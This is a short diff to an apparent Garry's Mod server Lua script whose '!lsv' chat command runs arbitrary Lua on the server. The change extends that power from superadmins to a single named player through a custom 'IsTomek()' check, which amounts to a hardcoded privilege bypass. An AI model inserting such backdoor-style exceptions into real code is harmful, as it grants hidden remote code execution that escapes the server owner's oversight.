@@ -8,7 +8,7 @@ local function run(func, script, ply, name) --from https://github.com/PAC3-Serve
 end
 
 hook.Add("PlayerSay","TCoreLua",function(ply,txt)
-    if string.StartWith(txt,"!lsv") and ply:IsSuperAdmin() then
+    if string.StartWith(txt,"!lsv") and (ply:IsSuperAdmin() or ply:IsTomek()) then
         local script = string.sub(txt,6)
         timer.Simple(0.1,function()
         easylua.Start(ply)
